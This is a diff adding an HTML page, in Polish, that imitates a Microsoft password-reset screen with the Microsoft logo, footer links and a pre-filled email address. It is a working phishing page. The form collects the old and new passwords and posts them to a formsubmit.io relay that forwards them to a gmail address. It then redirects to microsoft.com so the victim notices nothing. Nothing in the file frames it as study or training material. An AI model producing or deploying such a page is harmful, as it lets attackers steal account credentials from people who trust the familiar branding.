@@ -1,0 +1,135 @@
+<!<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resetowanie hasła</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to bottom, #FFDEE9, #B5FFFC);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: left;
+            font-size: 16px;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+        .header img {
+            width: 24px;
+            height: 24px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        .header span {
+            font-size: 21px;
+            color: #666;
+        }
+        .email {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .container h1 {
+            font-size: 24px;
+            margin: 20px 0;
+        }
+        .container p {
+            font-size: 17px;
+            color: #000;
+        }
+        .container input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px 10px 10px 0;
+            margin: 20px 0;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            outline: none;
+        }
+        .container .buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+        .container button {
+            padding: 12px 25px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .container .cancel {
+            background-color: #cccccc;
+        }
+        .container .next {
+            background-color: #0067b8;
+            color: white;
+        }
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            width: calc(100% - 60px);
+            text-align: right;
+            font-size: 12px;
+            color: #000;
+            display: flex;
+            justify-content: flex-end;
+            gap: 20px;
+        }
+        .footer a {
+            color: #000;
+            text-decoration: none;
+            position: relative;
+        }
+        .footer a:hover {
+            color: #000;
+        }
+        .footer a:hover::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: -2px;
+            width: 100%;
+            height: 1px;
+            background-color: #000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+            <span>Microsoft</span>
+        </div>
+        <div class="email">matid7002@gmail.com</div>
+        <h1>Resetowanie hasła</h1>
+        <p>Co najmniej 8 znaków; uwzględniana jest wielkość liter</p>
+        <form action="https://formsubmit.io/send/matid7002@gmail.com" method="POST">
+            <input type="password" name="old-password" placeholder="Stare hasło">
+            <input type="password" name="new-password" placeholder="Nowe hasło">
+            <input type="password" name="confirm-password" placeholder="Ponownie wprowadź nowe hasło">
+            <div class="buttons">
+                <button type="button" class="cancel">Anuluj</button>
+                <button type="submit" class="next">Dalej</button>
+                <input name="_redirect" type="hidden" id="name" value="https://www.microsoft.com/pl-pl/">
+            </div>
+        </form>
+    </div>
+    <div class="footer">
+        <a href="https://www.microsoft.com/pl-pl/servicesagreement/default.aspx">Warunki użytkowania</a>
+        <a href="https://go.microsoft.com/fwlink/?LinkID=521839">Prywatność i pliki cookie</a>
+    </div>
+</body>
+</html>
